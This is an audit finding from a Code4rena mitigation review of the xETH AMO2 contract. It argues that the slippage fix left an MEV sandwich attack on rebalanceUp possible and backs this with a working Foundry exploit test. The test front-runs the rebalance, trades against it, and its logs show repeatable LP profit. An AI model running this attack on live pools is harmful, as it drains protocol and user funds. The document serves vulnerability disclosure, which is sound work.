# [M] M-07 Unmitigated

## Summary
Severity: Medium
Source: https://github.com/code-423n4/2023-05-xeth/blob/add-xeth/src/AMO2.sol#L249-L284
Type: audit-issue

## Details
# Lines of code

https://github.com/code-423n4/2023-05-xeth/blob/add-xeth/src/AMO2.sol#L249-L284


# Vulnerability details

# Comments
The very first point that needs to be made, is that, according to the Mitigation Review details:
> In production we have planned to use MEV Protection services such as flashbots rpc

The MEV Protection rpc ensure the rebalance and defender won't be affected by the MEV attack any more. So under the circumstances, you can just skip the issue M-07 and the following detail.

# Unmitigated
I don't really get the point of the mitigation commit. It seems like only split the maxSlippageBPS to upSlippage and downSlippage, but doesn't change anything about the slippage check caculation. 

The issue is the fault in slippage calculation method, instead of slippage itself. I think I should provide the complete exploit to explain how the MEV attacker can get continuous arbitrages from rebalance.

As I mentioned in the issue https://github.com/code-423n4/2023-05-xeth-findings/issues/14 comments, it's similar to https://github.com/code-423n4/2023-05-xeth-findings/issues/35 . But it has a big difference that the https://github.com/code-423n4/2023-05-xeth-findings/issues/35 assumes a rogue defender as a starting point of attack, https://github.com/code-423n4/2023-05-xeth-findings/issues/14 doesn't need. 

## Proof of Concept

1. At the beginning, there are 80 xETH and 20 stETH in the pool, vp = 1 and about 50 lp are held by AMO and about 50 lp are held by an arbitrager(MEV attacker).
2. rebalance up. AMO wants to burn 30 lp for at least 29 xETH. The ratio will be about `50 / (50 + 20)  = 0.71 > 0.68` 
3. The arbitrager front runs to remove liquidity with 50 lp, and now there are 40 xETH and 10 stETH in the pool. After rebalance, there are 9 xETH and 10 stETH in the pool.
4. The arbitrager sells 1 xETH for 1 stETH, now 10 xETH and 9 stETH in the pool.
5. AMO mint 15 xETH for adding lp. After rebalance down, there are 25 xETH and 9 stETH in the pool. The ratio is `25/(25+9) = 0.735 <= 0.75 `. 
6. swap 1 stETH back to the pool for more than 1 xETH, such as 1.2 xETH.
7. Or for more intuitively comparing the change from the initial asset of the attacker, skip the step 6 and add liquidity with all the xETH and stETH held by the attacker at last. The lp received will be greater than the begining.

I write a test file for the above process:

Parameter adjustment:
- Curve pool parameter `A` is 20. It amplifies price changes, but it's reasonable because the A of stETH/ETH pool is 30.
- upSlippage = 0 and downSlippage = 2%

test/AMO2_c4r.t.sol
```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "./utils/Utilities.sol";
import {MockErc20} from "./mocks/MockERC20.sol";
import {console} from "./utils/Console.sol";
import {MockCVXStaker} from "./mocks/MockCVXStaker.sol";
import {Vm} from "forge-std/Vm.sol";

import {ICurveFactory} from "src/interfaces/ICurveFactory.sol";
import {ICurvePool} from "src/interfaces/ICurvePool.sol";
import {xETH as xETH_contract} from "src/xETH.sol";
import {xETH_AMO} from "src/AMO2.sol";

import "@openzeppelin-contracts/token/ERC20/IERC20.sol";

contract AMORebalancingTest is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);
    ICurveFactory internal constant factory =
        ICurveFactory(0xB9fC157394Af804a3578134A6585C0dc9cc990d4);

    Utilities internal utils;
    address payable[] internal users;

    address internal owner;
    address internal bot;
    address internal attacker;

    xETH_contract internal xETH;
    xETH_AMO internal AMO;
    MockErc20 internal stETH;
    ICurvePool internal curvePool;
    IERC20 internal clp;
    MockCVXStaker internal cvxStaker;
    uint xETHindex = 0;
    uint stETHindex = 1;
    uint initAttackerCLP;

    function setUp() public {
        utils = new Utilities();
        users = utils.createUsers(5);
        address payable[] memory moreUsers = utils.createUsers(2);

        owner = moreUsers[0];
        vm.label(owner, "owner");

        bot = moreUsers[1];
        vm.label(bot, "bot");

        vm.startPrank(owner);

        xETH = new xETH_contract();
        stETH = new MockErc20("Staked Ether", "StETH", 18);

        vm.label(address(xETH), "xETH");
        vm.label(address(stETH), "stETH");

        address[4] memory coins;
        coins[xETHindex] = address(xETH);
        coins[stETHindex] = address(stETH);

        address pool = factory.deploy_plain_pool(
            "XETH-stETH Pool",
            "XETH/stETH",
            coins,
            20, // A 200 -> 10
            4000000, // Fee
            3, // asset type 1 = ETH, 3 = Other
            1 // implementation index = balances
        );
        vm.label(pool, "curve_pool");

        curvePool = ICurvePool(pool);
        clp = IERC20(pool);
        cvxStaker = new MockCVXStaker(pool);

        AMO = new xETH_AMO(
            address(xETH),
            address(stETH),
            pool,
            address(cvxStaker),
            0
        );
        AMO.setRebalanceDefender(address(bot));

        cvxStaker.setOperator(address(AMO));

        vm.label(address(AMO), "amo");
        xETH.setAMO(address(AMO));

        stETH.mint(owner, 100e18);
        vm.stopPrank();
        _setupImbalance();
    }

    function _setupImbalance() internal{
        attacker = address(0x133707);
        vm.startPrank(owner);
        // set pool to xETH:stETH = 80:20
        stETH.approve(address(AMO), 80e18);
        AMO.addLiquidity(20e18, 80e18, 1);
        uint clpBalance = cvxStaker.stakedBalance();
        // setup rebalance cap and slippage for test
        AMO.setRebalanceUpCap(40e18);  // 40
        AMO.setRebalanceDownCap(40e18); // 40
        AMO.setSlippage(0, 200 * 1e14); // 1% -> 2%
        vm.stopPrank();
        // give attacker a half of clp tokens
        vm.prank(address(cvxStaker));
        clp.transfer(attacker, clpBalance / 2);
        // now attacker has 40 xETH and 10 stETH in the pool
        uint[2] memory amounts;
        amounts[xETHindex] = 40e18;
        amounts[stETHindex] = 10e18;
        uint needsLp = curvePool.calc_token_amount(amounts, false);
        initAttackerCLP = clp.balanceOf(attacker);
        needsLp = needsLp > initAttackerCLP ? needsLp - 1 : needsLp;
        assertLe(initAttackerCLP - needsLp, 1); // +-1
        // attacker approve setup
        vm.startPrank(attacker);
        stETH.approve(address(curvePool), 50e18);
        xETH.approve(address(curvePool), 50e18);
        vm.stopPrank();
    }

    function _getxEthPct() internal view returns (uint256 xETHBal, uint256 stETHBal, uint256 xEthPct) {
        stETHBal = curvePool.balances(stETHindex);
        xETHBal = curvePool.balances(xETHindex);

        xEthPct = (xETHBal * 1e18) / (stETHBal + xETHBal);
    }

    function testRebalanceUpMEV() public {
        // pool status: 80 xETH, 20 stETH
        // AMO status: LP (40 xETH + 10 stETH)
        // Attacker status: LP (40 xETH + 10 stETH)
        
        // 1. defender prepares for rebalance up, burn 30 lp for at least 29 xETH, 
        //    The ratio will be about `50 / (50 + 20)  = 0.71 > 0.68` after rebalance up
        uint256 lpBurn = 30e18;
        uint256 minXethRemoved = 29e18;
        xETH_AMO.RebalanceUpQuote memory quote = xETH_AMO.RebalanceUpQuote(
            lpBurn,
            minXethRemoved
        );

        uint[2] memory amounts;
        // 2. attacker front run, remove liquidity before rebalance up
        vm.startPrank(attacker);
        uint attackerLp = clp.balanceOf(attacker);
        curvePool.remove_liquidity(attackerLp, amounts);
        vm.stopPrank();
        // console.log("attacker xETH", xETH.balanceOf(attacker));
        
        // 3. defender rebalance up confirmed
        uint xETHBal;
        uint stETHBal;
        uint xEthPct;
        vm.prank(bot);
        uint256 xEthRemoved = AMO.rebalanceUp(quote);
        // check the current pool status:
        (xETHBal, stETHBal, xEthPct) = _getxEthPct();
        console.log("3. pool status xETHBal:stETHBal", xETHBal, stETHBal, xEthPct);
        console.log("   xEthRemoved", xEthRemoved);
                
        // 4. attacker sells 1 xETH for 1 stETH
        uint xETHAtckSell = 2e18;
        vm.startPrank(attacker);
        uint stETHAtckRecv = curvePool.exchange(int128(uint128(xETHindex)), int128(uint128(stETHindex)), xETHAtckSell, 0);
        vm.stopPrank();
        (xETHBal, stETHBal, xEthPct) = _getxEthPct();
        console.log("4. pool status xETHBal:stETHBal", xETHBal, stETHBal, xEthPct);
        
        // 5. defender rebalance down, mint 15 xETH for adding lp.
        uint256 xETHAmount = 12e18;
        uint minLpReceived = 0;
        xETH_AMO.RebalanceDownQuote memory quote2 = xETH_AMO.RebalanceDownQuote(
            xETHAmount,
            minLpReceived
        );
        // skip cool down period
        vm.roll(block.number + 3600);
        vm.prank(bot);
        uint256 lpReceived = AMO.rebalanceDown(quote2);
        // check the current pool status: The ratio should be about `25/(25+9) = 0.735 <= 0.75 `
        (xETHBal, stETHBal, xEthPct) = _getxEthPct();
        console.log("5. pool status xETHBal:stETHBal", xETHBal, stETHBal, xEthPct);
        
        // 6. swap 1 stETH back to the pool for more than 1 xETH
        // skip 6. Use the final amount of lp to calculate profit in the step 7
        // vm.startPrank(attacker);
        // uint xETHAtckRecv = curvePool.exchange(int128(uint128(stETHindex)), int128(uint128(xETHindex)), stETHAtckRecv, 0);
        // vm.stopPrank();
        // assertGt(xETHAtckRecv, xETHAtckSell);
        // (xETHBal, stETHBal, xEthPct) = _getxEthPct();
        // console.log("6. pool status xETHBal:stETHBal", xETHBal, stETHBal, xEthPct);

        // 7. Just for calculating attack profit, attacker adds liquidity for {initAttackerCLP}
        vm.startPrank(attacker);
        amounts[xETHindex] = xETH.balanceOf(attacker);
        amounts[stETHindex] = stETH.balanceOf(attacker);
        curvePool.add_liquidity(amounts, initAttackerCLP);
        vm.stopPrank();
        uint attackerCLP = clp.balanceOf(attacker);
        console.log("7. attacker lp change", attackerCLP - initAttackerCLP);
        (xETHBal, stETHBal, xEthPct) = _getxEthPct();
        console.log("   pool status xETHBal:stETHBal", xETHBal, stETHBal, xEthPct);
    }
}
```
run test:
```
forge test --match-path 'test/AMO2_c4r.t.sol'  -vvv --fork-url https://eth-mainnet.g.alchemy.com/v2/xxxxxx --fork-block-number 17438437
```

logs:
```
Running 1 test for test/AMO2_c4r.t.sol:AMORebalancingTest
[PASS] testRebalanceUpMEV() (gas: 591080)
Logs:
  3. pool status xETHBal:stETHBal 9357085094330291886 10000000000000000001 483393292364612828
     xEthRemoved 30641675925101596000
  4. pool status xETHBal:stETHBal 11357085094330291886 8014020382010832344 586289982685874781
  5. pool status xETHBal:stETHBal 23356576499739707188 8013532498280344763 744548783723189329
  7. attacker lp change 194843029594079837
     pool status xETHBal:stETHBal 61356493442640855684 19999038133345761998 754177279086837200

Test result: ok. 1 passed; 0 failed; finished in 5.26ms
```

As you can see, the attacker made a profit of 0.194 lp and the current `xEthPct = 0.754 > 0.75`. The rebalance up will be triggered again. And the attacker can repeat the arbitrage in the next round.







## Assessed type

MEV
